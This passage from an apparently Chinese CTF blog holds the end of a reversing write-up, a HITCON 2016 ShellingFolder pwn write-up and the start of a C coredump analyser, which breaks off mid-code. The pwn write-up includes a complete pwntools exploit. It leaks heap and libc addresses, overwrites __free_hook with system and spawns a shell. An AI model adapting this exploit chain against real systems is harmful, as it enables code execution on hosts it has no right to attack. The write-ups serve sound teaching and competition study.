class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(i + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</div><div class="line">        v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v21 + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</div><div class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v4 + v21 + v7[i]) - v4;</div><div class="line">        v17 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[i];</div><div class="line">        v7[i] = v7[v21];</div><div class="line">        v7[v21] = v17;</div><div class="line">        v16 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v7[i] + v7[v21])];</div><div class="line">        v8[j] ^= v16;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x "</span>, v8[j]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第二部分将6个字符通过各种位运算和结果作比较，爆破下就好(刚开始自己犯蠢烦了出题人好久，惭愧惭愧)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment">#Basic_</span></div><div class="line">input3 = <span class="string">'_'</span></div><div class="line"></div><div class="line">input2_list = []</div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</div><div class="line">    <span class="keyword">if</span> ord(<span class="string">'='</span>) == ((<span class="number">4</span> * ord(c)) flag <span class="number">0x3c</span>) + (ord(input3) &gt;&gt; <span class="number">6</span>) + <span class="number">48</span>:</div><div class="line">        input2_list.append(c)</div><div class="line"></div><div class="line"><span class="keyword">print</span> input2_list</div><div class="line"></div><div class="line"><span class="keyword">for</span> fix <span class="keyword">in</span> range(<span class="number">0x10</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> input2_list:</div><div class="line">        <span class="keyword">if</span> ord(<span class="string">'F'</span>) == ((<span class="number">16</span> * (<span class="number">0x60</span> + fix)) &amp; <span class="number">0x30</span>) + (ord(i) &gt;&gt; <span class="number">4</span>) + <span class="number">48</span>:</div><div class="line">            <span class="keyword">print</span> chr(fix + <span class="number">0x60</span>), i</div></pre></td></tr></table></figure></p>
<p>第三部分坑点来了。。。不知是何原因程序在还原这一段代码时有大概率出错，IDA很难解析出正确的汇编代码，多次尝试后找到了验证逻辑，<br>将输入的字符高4位低4位互换(0x61变成0x16),异或0x11后和结果对比，这一部分没写代码手动解，结果是<code>0f_RE_a</code><br>第四部分和第三部分同样的问题，只是出错概率更大，多次尝试后放弃调试，直接手动还原出代码放到IDA里面分析，发现是输入和常量对比，<br>然后就还原出了整个flag(上一部分最后那个<code>a</code>到这一部分就不对了，而且这一部分的代码还是用这个<code>a</code>异或出来的，略有点神奇)  </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-HITCON-CTF-2016-ShellingFolder" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/" class="article-date">
  	<time datetime="2016-11-11T17:31:49.000Z" itemprop="datePublished">2016-11-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/">
        HITCON CTF 2016 ShellingFolder
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><blockquote>
<p>link: <a href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/ShellingFolder" title="ShellingFolder">ShellingFolder</a>  </p>
</blockquote>
<h2 id="漏洞-amp-amp-利用"><a href="#漏洞-amp-amp-利用" class="headerlink" title="漏洞 &amp;&amp; 利用"></a>漏洞 &amp;&amp; 利用</h2><p><img src="/HITCON-CTF-2016-ShellingFolder/vul.jpg" alt=""><br>栈上的<code>s</code>只有24个字节，最多可以复制32个字节，刚好覆盖到<code>v3</code>，通过更改<code>v3</code>来达到修改任意地址数据，从而实现任意地址读写<br><code>File-&gt;Size</code>长度为32位有符号整数，而指针长度为64位，所以要注意到寄存器相加时的符号及数据长度问题<br>另外，程序开启<code>RELRO</code>，不能修改<code>GOT</code>，最后利用方法是在修改一个已存在的<code>File</code>为<code>&#39;sh\x00&#39;</code>，将libc中的<code>__free_hook</code>修改为system，<br>效果等同于修改<code>free@got</code>，将修改过的<code>File</code>删除即可<br>这个题是在本机上做的，不知道原题给的libc是不是可以通用<br>不过毕竟是HITCON，一个变量溢出都能玩的这么高端<br>利用脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">NewFile</span><span class="params">(p, size, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Name of File:'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'Size of File:'</span>)</div><div class="line">    p.send(str(size))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">NewFolder</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Name of Folder:'</span>)</div><div class="line">    p.send(name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeDir</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a Folder :'</span>)</div><div class="line">    p.send(name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveFile</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'5'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a Folder or file :'</span>)</div><div class="line">    p.send(name + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalcSize</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'6'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ListDir</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./shellingfolder'</span>)</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./local.libc'</span>)</div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line"></div><div class="line">CalcSize(p)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line">heap_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">heap_base = heap_addr - <span class="number">0x88</span></div><div class="line"></div><div class="line">leak_addr = heap_base + <span class="number">0x258</span></div><div class="line"></div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'A'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'B'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'C'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'D'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'E'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'F'</span> * <span class="number">8</span>)</div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'E'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'C'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'A'</span> * <span class="number">8</span>)<span class="comment">#Now there should be a pointer point to main_arena</span></div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'B'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'D'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'F'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">'heap base: '</span> + hex(heap_base))</div><div class="line">log.info(<span class="string">'leak addr: '</span> + hex(leak_addr))</div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(heap_base + <span class="number">0x20</span>)</div><div class="line"></div><div class="line">payload2 = <span class="string">''</span></div><div class="line">payload2 += <span class="string">'B'</span> * <span class="number">0x18</span></div><div class="line">payload2 += p64(heap_base + <span class="number">0x20</span> + <span class="number">0x04</span>)</div><div class="line"></div><div class="line">NewFile(p, (leak_addr - <span class="number">0x58</span>) &amp; <span class="number">0xffffffff</span>, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, leak_addr &gt;&gt; <span class="number">32</span>, payload2[:<span class="number">30</span>])</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#Create a fake subfile to leak libc</span></div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">p.recvuntil(payload2[:<span class="number">30</span>] + <span class="string">'\n'</span>)</div><div class="line">libc_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">libc_base = libc_addr - <span class="number">0x3a3678</span></div><div class="line"></div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">free_hook = libc_base + <span class="number">0x3a57c8</span></div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">log.info(<span class="string">'libc base: '</span> + hex(libc_base))</div><div class="line">log.info(<span class="string">'system addr: '</span> + hex(system_addr))</div><div class="line">log.info(<span class="string">'free_hook addr: '</span> + hex(free_hook))</div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">NewFolder(p, <span class="string">'DirToWriteFreeHook'</span>)</div><div class="line">ChangeDir(p, <span class="string">'DirToWriteFreeHook'</span>)</div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(free_hook)</div><div class="line"></div><div class="line">payload2 = <span class="string">''</span></div><div class="line">payload2 += <span class="string">'B'</span> * <span class="number">0x18</span></div><div class="line">payload2 += p64(free_hook + <span class="number">0x04</span>)</div><div class="line"></div><div class="line">NewFile(p, system_addr &amp; <span class="number">0xffffffff</span>, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, system_addr &gt;&gt; <span class="number">32</span>, payload2[:<span class="number">30</span>])</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#write __free_hook</span></div><div class="line"></div><div class="line">NewFolder(p, <span class="string">'DirToWriteSh'</span>)</div><div class="line">ChangeDir(p, <span class="string">'DirToWriteSh\n'</span>)</div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">sh = <span class="number">0x3b6873</span></div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(heap_base + <span class="number">0x490</span>)</div><div class="line"></div><div class="line">NewFile(p, sh, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'FileToPutSh\x00'</span>)</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#write 'sh;\x00'</span></div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'FileToPutSh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Simple-Core-Dump-analyser" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/10/24/Simple-Core-Dump-analyser/" class="article-date">
  	<time datetime="2016-10-24T09:08:38.000Z" itemprop="datePublished">2016-10-24</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/10/24/Simple-Core-Dump-analyser/">
        Simple Core Dump analyser
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>起因是XNUCA AI专题的一道题，题目要求编写程序，给出目标程序以及目标程序崩溃时产生的coredump文件，<br>分析出程序崩溃的原因(栈溢出或者堆溢出),以及漏洞地址<br>题目先前给出的条件中有一个运行时间的规定，规定时长2分钟，心想这时间是不是长了点，<br>是不是写个操纵gdb的程序然后用gdb来找溢出点呢？(笑   </p>
<h2 id="engage"><a href="#engage" class="headerlink" title="engage"></a>engage</h2><p>既然是要分析coredump文件，就要了解coredump文件的具体结构<br>通过几天的学习，发现coredump文件和普通elf程序文件存在以下几个区别<br>1.没有导入表，虽然coredump完整的保留了源程序的plt和got，但无法直接得出程序调用了什么函数<br>2.多了一个NOTE段，保留了程序崩溃现场，对于我们来说最有用的就是保留下来的寄存器情况<br>3.保留了源程序崩溃时的栈以及堆的情况，这也是本程序的关键  </p>
<p>接下来是具体分析过程了，现在可以从coredump中分析得出崩溃时的所有寄存器信息以及整个堆栈，问题就是如何从这些信息分析出程序崩溃的原因，<br>栈溢出崩溃是因为发生了栈上的越界读写，导致<code>EIP</code>被改写到了非法地址，或者<code>EBP</code>被改写，函数返回恢复栈时因为错误的EBP而导致栈被转移而发生错误<br>这两种情况的交际就是栈上的EBP肯定都被破坏,所以只要检测出程序崩溃时的EBP是否合法即可判定是否是栈溢出，(题目只给了两种情况，要么是栈溢出要么是堆溢出)  </p>
<p>接下来就是分析溢出点了，溢出点利用栈上的返回地址回溯即可找到崩溃地址，结合源程序的.text段就可以分析出崩溃地址<br>对于堆溢出，采用栈的向后回溯方法，栈溢出则采用向前回溯的方法<br>原因在于栈溢出发生崩溃是在函数返回之后，而堆溢出则是发生在函数返回之前  </p>
<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(i)    ((i)&gt;&gt;4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i)    ((i)&amp;0xf)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b,t)     (((b)&lt;&lt;4)+((t)&amp;0xf))</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">short</span> <span class="keyword">int</span> Elf32_Half; </div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> Elf32_Word;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> Elf32_Off;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> Elf32_Addr;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</div><div class="line">    Elf32_Half e_type;</div><div class="line">    Elf32_Half e_machine;</div><div class="line">    Elf32_Word e_version;</div><div class="line">    Elf32_Addr e_entry;</div><div class="line">    Elf32_Off  e_phoff;</div><div class="line">    Elf32_Off  e_shoff;</div><div class="line">    Elf32_Word e_flags;</div><div class="line">    Elf32_Half e_ehsize;</div><div class="line">    Elf32_Half e_phentsize;</div><div class="line">    Elf32_Half e_phnum;</div><div class="line">    Elf32_Half e_shentsize;</div><div class="line">    Elf32_Half e_shnum;</div><div class="line">    Elf32_Half e_shstrndx;</div><div class="line">&#125; Elf32_Ehdr; </div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    Elf32_Word sh_name;</div><div class="line">    Elf32_Word sh_type;</div><div class="line">    Elf32_Word sh_flags;</div><div class="line">    Elf32_Addr sh_addr;</div><div class="line">    Elf32_Off  sh_offset;</div><div class="line">    Elf32_Word sh_size;</div><div class="line">    Elf32_Word sh_link;</div><div class="line">    Elf32_Word sh_info;</div><div class="line">    Elf32_Word sh_addralign;</div><div class="line">    Elf32_Word sh_entsize;</div><div class="line">&#125; Elf32_Shdr;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    Elf32_Word p_type;</div><div class="line">    Elf32_Off  p_offset;</div><div class="line">    Elf32_Addr p_vaddr;</div><div class="line">    Elf32_Addr p_paddr;</div><div class="line">    Elf32_Word p_filesz;</div><div class="line">    Elf32_Word p_memsz;</div><div class="line">    Elf32_Word p_flags;</div><div class="line">    Elf32_Word p_align;</div><div class="line">&#125; Elf32_Phdr;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">u32</span><span class="params">(<span class="keyword">char</span> <span class="built_in">string</span>[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> result = <span class="number">0</span>;</div><div class="line">    <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;result, <span class="built_in">string</span>, <span class="number">4</span>);</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">ForwardTrace</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> TextStart, <span class="keyword">unsigned</span> <span class="keyword">int</span> TextRange, <span class="keyword">unsigned</span> <span class="keyword">int</span> StackBase, <span class="keyword">int</span> EspOffset)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> offset = EspOffset;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> value;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">5</span>];</div><div class="line">    <span class="keyword">while</span> ( offset &gt; <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">5</span>);</div><div class="line">        fseek(fp, StackBase + offset, SEEK_SET);</div><div class="line">        fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp);</div><div class="line">        value = u32(buf);</div><div class="line">        <span class="keyword">if</span> ( value &gt; TextStart &amp;&amp; value &lt; (TextStart + TextRange) )</div><div class="line">            <span class="keyword">return</span> ((value - <span class="number">5</span>) - TextStart);</div><div class="line">            <span class="comment">//return value;</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            offset = offset - <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">BackTrace</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> TextStart, <span class="keyword">unsigned</span> <span class="keyword">int</span> TextRange, <span class="keyword">unsigned</span> <span class="keyword">int</span> start, <span class="keyword">int</span> range)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> value;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">5</span>];</div><div class="line">    <span class="keyword">while</span> ( offset &lt;= range )</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">5</span>);</div><div class="line">        fseek(fp, start + offset, SEEK_SET);</div><div class="line">        fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp);</div><div class="line">        value = u32(buf);</div><div class="line">        <span class="keyword">if</span> ( value &gt; TextStart &amp;&amp; value &lt; (TextStart + TextRange) )</div><div class="line">            <span class="keyword">return</span> ((value - <span class="number">5</span>) - TextStart);</div><div class="line">            <span class="comment">//return value;</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            offset = offset + <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line">    <span 